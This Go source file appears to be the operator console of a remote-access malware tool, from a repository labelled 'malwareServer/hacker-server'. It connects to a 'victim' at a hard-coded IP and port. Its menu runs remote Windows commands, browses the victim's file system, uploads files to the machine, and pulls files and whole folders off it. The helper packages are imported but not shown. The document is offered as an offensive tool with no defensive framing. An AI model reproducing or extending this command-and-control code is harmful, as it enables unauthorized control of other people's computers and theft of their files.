package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"strings"

	execute "github.com/ReflectionShade/base/P3_malwareServer/hacker-server/core/Execute-commands-windows"
	"github.com/ReflectionShade/base/P3_malwareServer/hacker-server/core/download"
	handleconnection "github.com/ReflectionShade/base/P3_malwareServer/hacker-server/core/handleConnection"
	move "github.com/ReflectionShade/base/P3_malwareServer/hacker-server/core/move"
	"github.com/ReflectionShade/base/P3_malwareServer/hacker-server/core/upload"
)

type Data struct {
	Name string
	ID   int
	Age  float32
}

func options() {
	fmt.Println("\t[1] Execute Command")
	fmt.Println("\t[2] Move in File system")
	fmt.Println("\t[3] Upload file")
	fmt.Println("\t[4] Download file")
	fmt.Println("\t[5] Download folder")
	fmt.Println("\t[99] Exit")
	fmt.Println()
}

func main() {
	var connection net.Conn

	IP := "192.168.0.223"
	Port := "9090"

	connection, err := handleconnection.ConnectWithVictim(IP, Port)
	if err != nil {
		log.Fatal(err)
	}
	defer connection.Close()

	fmt.Println("[+] Connection established with " + connection.RemoteAddr().String())

	reader := bufio.NewReader(os.Stdin)

	loopControl := true
	for loopControl {
		options()
		fmt.Printf("[+] Enter Options ")
		userInputRaw, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println(err)
			continue
		}

		connection.Write([]byte(userInputRaw))

		userInput := strings.TrimSuffix(userInputRaw, "\n")

		switch {
		case userInput == "1":
			fmt.Println("[+] Command Execution program")
			err := execute.ExecuteCommandRemotelyWindows(connection)
			if err != nil {
				log.Println(err)
			}

		case userInput == "2":
			fmt.Println("[+] Navigating File system in Victin")
			err = move.NavigateFileSystem(connection)
			if err != nil {
				fmt.Println(err)
			}

		case userInput == "3":
			fmt.Println("[+] Uploading file to the Victim")
			err = upload.UploadFile2Victim(connection)
			if err != nil {
				fmt.Println(err)
			}

		case userInput == "4":
			fmt.Println("[+] Downloading file from the Victim")
			err = download.DownloadFileFromVictim(connection)
			if err != nil {
				fmt.Println(err)
			}

		case userInput == "5":
			fmt.Println("[+] Downloading folder from the Victim")
			err = download.DownloadFolderFromVictim(connection)
			if err != nil {
				fmt.Println(err)
			}

		case userInput == "99":
			fmt.Println("[+] Exiting the program")
			loopControl = false
		default:
			fmt.Println("[-] Invalid option, try again")
		}
	}
}
